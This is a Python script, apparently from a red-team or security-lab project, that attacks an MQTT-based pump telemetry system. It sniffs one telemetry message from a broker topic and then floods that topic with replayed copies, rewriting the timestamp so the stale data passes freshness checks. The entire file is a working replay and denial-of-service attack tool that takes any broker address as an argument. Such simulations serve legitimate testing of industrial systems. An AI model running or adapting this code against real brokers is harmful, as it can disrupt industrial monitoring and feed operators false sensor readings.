import argparse
from datetime import datetime
import json
from pathlib import Path
import sys
import time

_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from common.mqtt_config import ProjectConfig, create_mqtt_client


def main():
    cfg = ProjectConfig()
    parser = argparse.ArgumentParser(description="Scenario 1: Passive MQTT sniffing + volumetric replay DoS simulation.")
    parser.add_argument("--broker", default=cfg.broker_address)
    parser.add_argument("--port", type=int, default=cfg.broker_port)
    parser.add_argument("--topic", default=cfg.topic_telemetry)
    parser.add_argument("--interval", type=float, default=0.005, help="Delay between replayed packets in seconds")
    parser.add_argument("--max-packets", type=int, default=0, help="Optional max packets (0 = until Ctrl+C)")
    args = parser.parse_args()

    state = {"captured_payload": None}

    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print("[RED TEAM] Connected! Starting passive sniffing & replay phase...")
            client.subscribe(args.topic)
        else:
            print(f"[ERROR] MQTT connection failed (rc={rc})")

    def on_message(client, userdata, msg):
        if state["captured_payload"] is None:
            try:
                captured = json.loads(msg.payload.decode("utf-8"))
                state["captured_payload"] = captured
                print("[SNIFFER] Baseline telemetry packet captured successfully!")
                print(f"    -> Observed current RPM: {captured['sensori']['S1_Pompa_RPM']}")
            except (json.JSONDecodeError, KeyError, UnicodeDecodeError) as exc:
                print(f"[SNIFFER] Ignored invalid packet: {exc}")

    # Single MQTT client handle across sniffing and replay (properly stopped on exit)
    client = create_mqtt_client(client_id="RedTeam_DoS_Attacker", cfg=cfg)
    client.on_connect = on_connect
    client.on_message = on_message

    print(f"Connecting to {args.broker}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()

    try:
        print("[LISTEN] Waiting to capture baseline pump telemetry...")
        while state["captured_payload"] is None:
            time.sleep(0.1)

        # Unsubscribe immediately after capture to avoid flooding the attacker receive buffer
        client.unsubscribe(args.topic)
        stolen_payload = state["captured_payload"]

        print("[ATTACK] Launching volumetric replay flood...")
        counter = 0
        while args.max_packets <= 0 or counter < args.max_packets:
            # Update timestamp so the replayed payload passes schema freshness formatting
            stolen_payload["timestamp"] = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
            payload_str = json.dumps(stolen_payload)
            client.publish(args.topic, payload_str, qos=0)

            counter += 1
            if counter % 100 == 0:
                print(f"[+] Sent {counter} replayed telemetry packets...")
            if args.interval > 0:
                time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n[STOP] DoS replay attack stopped.")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()

